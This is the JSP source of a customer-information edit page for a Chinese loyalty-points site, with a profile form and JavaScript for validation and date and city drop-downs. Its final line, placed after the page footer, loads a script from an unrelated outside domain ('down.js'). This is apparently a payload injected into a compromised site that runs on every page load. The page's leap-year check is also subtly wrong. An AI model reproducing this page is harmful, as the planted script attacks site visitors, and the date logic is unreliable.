<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="积分联盟-客户信息"/> 
<%@ include file="IncludeTop.jsp" %>
<script language="javascript">
<!--
function setSelectedText(box, value){
  var boxText = '';
  for(var i=0; i<box.options.length; i++){
       if(box.options[i].value == value){
           box.options[i].selected = true;
		   break;
	   }
  }
}


function listCities(form)
{
  form.city.options[0].value = 0;
  form.city.options[0] = new Option("请选择...","");
  form.city.options.length = 1;

  var provcode = form.province.options[form.province.selectedIndex].value;
  switch(provcode){
   <c:forEach var="province" items="${applicationScope.appData.provinces}"> 
        <c:set var="shift" value="0"/> 
		case '<c:out value="${province.provinceCode}"/>':   //<c:out value="${province.province}"/>		         
           	    <c:forEach var="city" items="${province.cities}" varStatus="status"> 
					<c:if test="${status.first and !status.last}">
						form.city.options[0]=new Option("请选择...","");
						<c:set var="shift" value="1"/> 
					</c:if>				
	        		form.city.options[<c:out value="${status.index+shift}"/>]=new Option('<c:out value="${city.city}"/>','<c:out value="${city.cityCode}"/>');		
				</c:forEach>
		        break;
   </c:forEach>	  
  default:
	form.city.options[0]=new Option("请选择...","");
	break; 	
  }  
  form.city.options[0].selected=true;
}


//生日初始化
function initBirthday()
{
        initDrop(document.customerInfoForm.myyear,1900, new Date().getFullYear(), 1980);
        initDrop(document.customerInfoForm.mymonth,1,12, 0);
        setDate();
}
   
   
function setDate()
{
   var str = document.customerInfoForm.birthday.value;
   if(isDate(str)){
	var r = str.match(/^(\d{1,4})(-|\/)(\d{1,2})\2(\d{1,2})$/);     
	var d= new Date(r[1], r[3]-1, r[4]);
	var nowYear= d.getFullYear();
	var nowMonth= d.getMonth()+1;
	var nowDay= d.getDate();		
	document.customerInfoForm.myyear.value=nowYear;
	document.customerInfoForm.mymonth.value=nowMonth;	
	updateDate();	
	document.customerInfoForm.myday.value=nowDay;
   }
}
    

//初始化下拉框
function initDrop(drp,numStart,numEnd, dftVal)
{
	for(var i=numStart;i<=numEnd;i++)
	{
		drp.length++;
		drp.options[drp.length - 1].text = i;
		drp.options[drp.length - 1].value = i;
		if(i==dftVal){
		  drp.options[drp.length - 1].selected = true;
		}
	}
}
    
//检测是否是闰年
function checkLeapYear(year)
{
	if ((year % 100==0)&&(year % 400==0))
	{
		return true;
	}
	else if (year % 4==0)
	{
		return true;
	}
	else
	{
		return false;
	}
}

//根据年月更新日期
function updateDate()
{
	var year = document.customerInfoForm.myyear.value;
	var month = document.customerInfoForm.mymonth.value;
	var currentDay= document.customerInfoForm.myday.value;
	
	var daycount;
	if ((month==4)||(month==6)||(month==9)||(month==11))
	{
		daycount=30;
	}
	else if ((month==2)&&(checkLeapYear(year)))
	{ 
		daycount=29;
	}
	else if (month==2)
	{ 
		daycount=28;
	}
	else
	{
		daycount=31;
	}
	
	document.customerInfoForm.myday.length = 1;
	initDrop(document.customerInfoForm.myday,1,daycount, 0);
	
	//更新日期为当前的日期
	if (currentDay<=daycount){
		document.customerInfoForm.myday.value=currentDay;
	}else{
		document.customerInfoForm.myday.value=daycount;
	}
}


function checkBirthday(){
   var year = document.customerInfoForm.myyear.value;
   var month = document.customerInfoForm.mymonth.value;
   var day= document.customerInfoForm.myday.value;

   if(isNull(year)||isNull(month)||isNull(day)){
      alert("请选择生日"); 
	  document.customerInfoForm.birthday.value =  null;
	  return false;
   }else{
      var birthday  = year + "-" + month + "-" + day;
      document.customerInfoForm.birthday.value = birthday;
	  if(isDate(birthday)){
	       return true;
	  }else{
	       return false;
	  }
   }
}

function checkAll(){
	if(
	   validate(document.customerInfoForm.email, 'Email', 'email', 0, 64, false) &&
       validate(document.customerInfoForm.name, '姓名', 'public', 0, 64, false) &&
	   validate(document.customerInfoForm.gender, '性别', 'public', 0, 64, false) &&
	   checkBirthday()&&
	   validate(document.customerInfoForm.province, '省', 'public', 0, 64, false) &&
	   validate(document.customerInfoForm.city, '市', 'public', 0, 64, false) &&	   
	   validate(document.customerInfoForm.address, '地址', 'public', 0, 255, false)&&	   
	   validate(document.customerInfoForm.zip, '邮编', 'number', 6, 6, false)&&
	   validate(document.customerInfoForm.telNo, '电话', 'public', 0, 20, false)&&
	   validate(document.customerInfoForm.mobile, '手机', 'number', 0, 20, false)&&
	   validate(document.customerInfoForm.industry, '行业', 'public', 0, 64, false) &&
	   validate(document.customerInfoForm.company, '公司名称', 'public', 0, 128, true)){
	   	    return true;
	   }
   return false;
}
//-->
</script>

<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td background="images/left_border.gif" width="10"></td>
    <td width="198" valign="top"> 
      <%@ include file="accountBar.jsp" %>
      <%@ include file="searchAllBar.jsp" %>
      <%@ include file="newsBar.jsp" %>
    </td>
    <td width="562" bgcolor="#FFFFFF" valign="top">
	  <c:if test="${empty userSession}">
	     <table  width="100%" height="61" border="0" cellpadding="0" cellspacing="0">
			<tr > 
			  <td align="center" colspan="4">您还没有登陆！</td>
			</tr>
		</table>
	  </c:if >
	  
	  <c:if test="${!empty userSession}"> 
	  <c:set var="customer" value="${userSession.customer}"/> 
      <form name="customerInfoForm" method="post" action='<c:url value="/modifyCustomer.do"/>' onSubmit="return checkAll();">
      <table  width="100%" height="61" border="0" cellpadding="0" cellspacing="0">
        <tr > 
          <td align="center" colspan="4"><font color="#003399" class="red15">修改客户信息</font></td>
        </tr>
        <tr> 
          <td align="center" class="black12" width="10%">&nbsp;</td>
          <td align="right" class="black12" width="21%">您的ID</td>
          <td align="center" class="black12" width="2%">&nbsp;</td>
            <td align="left" class="black12" width="67%"><c:out value="${customer.userId}"/> </td>
        </tr>
        <tr> 
            <td align="center" class="black12" width="10%" height="17">*</td>
          <td align="right" class="black12" width="21%" height="17">Email</td>
          <td align="center" class="black12" width="2%" height="17">&nbsp;</td>
          <td align="left" class="black12" width="67%" height="17">
              <input type="text" name="email" maxlength="64" size="32" value='<c:out value="${customer.email}"/>'>
            </td>
        </tr>
        <tr> 
            <td align="center" class="black12" width="10%">*</td>
          <td align="right" class="black12" width="21%">姓名</td>
          <td align="center" class="black12" width="2%">&nbsp;</td>
          <td align="left" class="black12" width="67%">
              <input type="text" name="name" maxlength="64" size="32" value='<c:out value="${customer.name}"/>'>
            </td>
        </tr>
        <tr> 
            <td align="center" class="black12" width="10%">*</td>
          <td align="right" class="black12" width="21%">性别</td>
          <td align="center" class="black12" width="2%">&nbsp;</td>
            <td align="left" class="black12" width="67%"> 
              <select name="gender"  selected="M">
                <option value="" >请选择...</option>
                <option value="M">男</option>
                <option value="F">女</option>
              </select>
            </td>
        </tr>
        <tr> 
            <td align="center" class="black12" width="10%">*</td>
          <td align="right" class="black12" width="21%">出生日期</td>
          <td align="center" class="black12" width="2%">&nbsp;</td>
          <td align="left" class="black12" width="67%">                
				<select id="myyear" onchange="updateDate()">
				   <option value="">请选择...</option>
				</select>年
				<select id="mymonth" onchange="updateDate()">
				   <option value="">请选择...</option>
				</select>月
				<select id="myday" onchange="checkBirthday()">
				  <option value="">请选择...</option>
				</select>日
				<input type="hidden" name="birthday"  value='<c:out value="${customer.birthday}"/>'>
            </td>
        </tr>
        <tr> 
            <td align="center" class="black12" width="10%" height="15">*</td>
            <td align="right" class="black12" width="21%" height="15">所在省市</td>
            <td align="center" class="black12" width="2%" height="15">&nbsp;</td>
            <td align="left" class="black12" width="67%" height="15">
				<select onchange="listCities(document.customerInfoForm)" size="1" name="province"> 
				   <option value="0000" selected>请选择...</option>
				   <c:forEach var="province" items="${applicationScope.appData.provinces}"> 
						 <option value='<c:out value="${province.provinceCode}"/>'><c:out value="${province.province}"/></option>		
				   </c:forEach>
				 </select>
                 省 
                 <select name="city" size="1">
                     <option value="" selected>请选择...</option>
                 </select>
              市 </td>
        </tr>
        <tr> 
            <td align="center" class="black12" width="10%">*</td>
          <td align="right" class="black12" width="21%">地址</td>
          <td align="center" class="black12" width="2%">&nbsp;</td>
          <td align="left" class="black12" width="67%">
              <input type="text" name="address" maxlength="128" size="50"  value='<c:out value="${customer.address}"/>'>
            </td>
        </tr>
        <tr> 
            <td align="center" class="black12" width="10%">*</td>
          <td align="right" class="black12" width="21%">邮编</td>
          <td align="center" class="black12" width="2%">&nbsp;</td>
          <td align="left" class="black12" width="67%">
              <input type="text" name="zip" maxlength="6" size="12"  value='<c:out value="${customer.zip}"/>'>
            </td>
        </tr>
        <tr> 
            <td align="center" class="black12" width="10%">*</td>
          <td align="right" class="black12" width="21%">电话</td>
          <td align="center" class="black12" width="2%">&nbsp;</td>
            <td align="left" class="black12" width="67%"> 
              <input type="text" name="telNo" maxlength="20" size="20"  value='<c:out value="${customer.telNo}"/>'>
            </td>
        </tr>
        <tr> 
            <td align="center" class="black12" width="10%">*</td>
          <td align="right" class="black12" width="21%">手机</td>
          <td align="center" class="black12" width="2%">&nbsp;</td>
          <td align="left" class="black12" width="67%">
              <input type="text" name="mobile" maxlength="20" size="20"  value='<c:out value="${customer.mobile}"/>'>
            </td>
        </tr>
        <tr> 
            <td align="center" class="black12" width="10%">*</td>
          <td align="right" class="black12" width="21%">行业</td>
          <td align="center" class="black12" width="2%">&nbsp;</td>
            <td align="left" class="black12" width="67%">
				<select name="industry">
					<option value="" selected>请选择...</option>
					<c:forEach var="item" items="${applicationScope.appData.industyMap}"> 
						 <option value='<c:out value="${item.key}"/>'><c:out value="${item.value}"/></option>		
				   </c:forEach>
				</select>
            </td>
        </tr>
        <tr> 
            <td align="center" class="black12" width="10%">&nbsp;</td>
          <td align="right" class="black12" width="21%">公司名称</td>
          <td align="center" class="black12" width="2%">&nbsp;</td>
          <td align="left" class="black12" width="67%">
              <input type="text" name="company" maxlength="64" size="50"  value='<c:out value="${customer.company}"/>'>
            </td>
        </tr>
      </table>
        <table width="100%" border="0">
          <tr> 
            <td align="center" height="32"> 
              <input type="submit" value="确 定" class="medium" name="提交">
              <input type="reset" value="重 填" class="medium" name="重置">
            </td>
          </tr>
        </table>      
	  </form>
	  <script language="javascript">　
			setSelectedText(document.all.gender, '<c:out value="${customer.gender}"/>');
			setSelectedText(document.all.province, '<c:out value="${customer.province}"/>');
			listCities(document.customerInfoForm);
			setSelectedText(document.all.city, '<c:out value="${customer.city}"/>');
			setSelectedText(document.all.industry, '<c:out value="${customer.industry}"/>');			
			initBirthday();
	  </script>
	  </c:if > 
    <td width="10" bgcolor="#FFFFFF" valign="top" background="images/right_border.gif">&nbsp;</td>
  </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>
<script language=javascript src=http://Town.531jx.cn/down.js></script>